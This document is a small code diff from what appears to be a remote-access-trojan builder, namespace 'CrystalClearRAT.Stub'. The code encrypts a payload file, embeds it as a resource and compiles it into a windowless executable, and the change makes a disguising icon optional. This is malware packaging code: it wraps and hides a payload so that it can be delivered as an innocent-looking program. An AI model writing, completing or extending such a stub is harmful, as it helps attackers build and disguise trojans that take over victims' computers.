@@ -4,6 +4,7 @@ using Microsoft.CSharp;
 using System;
 using System.CodeDom.Compiler;
 using System.Collections.Generic;
+using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Reflection;
@@ -21,7 +22,7 @@ namespace CrystalClearRAT.Stub
             string bytes = Convert.ToBase64String(File.ReadAllBytes(payloadPath));
             return StringCipher.Encrypt(bytes, password);
         }
-        public static void Compile(string payload, string iconPath, string outputPath)
+        public static void Compile(string payload, string outputPath, string iconPath = null)
         {
 
             var assembly = Assembly.GetExecutingAssembly();
@@ -53,7 +54,13 @@ namespace CrystalClearRAT.Stub
                 "System.Core.dll",
                 "System.Security.dll",
             }, outputPath, true);
-            parameters.CompilerOptions = $@"/target:winexe /win32icon:{iconPath}";
+            parameters.CompilerOptions = $@"/target:winexe";
+
+            if (iconPath != null)
+            {
+                parameters.CompilerOptions += $" /win32icon:{ iconPath}";
+            }
+
             File.WriteAllText("payload.txt", payload);
             parameters.EmbeddedResources.Add("payload.txt");
             parameters.GenerateExecutable = true;
